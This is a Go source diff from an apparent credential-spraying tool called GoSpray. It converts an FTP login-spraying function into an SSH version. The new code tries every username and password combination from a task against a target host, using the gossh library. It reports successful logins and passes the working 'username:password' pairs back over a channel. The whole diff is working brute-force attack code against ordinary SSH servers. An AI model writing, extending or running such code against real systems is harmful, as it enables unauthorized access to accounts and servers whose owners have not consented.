@@ -2,29 +2,26 @@ package main
 
 import (
 	"fmt"
-	"github.com/GoSpray/goftp"
+	"github.com/GoSpray/gossh"
 	"sync"
 )
 
 
 
-func ftpSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task) {
+func sshSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task) {
 	defer wg.Done()
 	for _,username := range taskToRun.usernames {
 		for _,password := range taskToRun.passwords {
-
-			ftpClient, err := goftp.NewFtp(stringifyTarget(taskToRun.target))
+			sshClient, err := gossh.DialWithPasswd(stringifyTarget(taskToRun.target), username, password)
 			if err != nil {
-				panic(err)
-			}
-
-			if err = ftpClient.Login(username, password); err != nil {
 				fmt.Print("-")
 			} else {
 				fmt.Print("+")
 				channelToCommunicate <- username+":"+password
+				sshClient.Close()
 			}
-			ftpClient.Close()
+
+
 		}
 	}
 
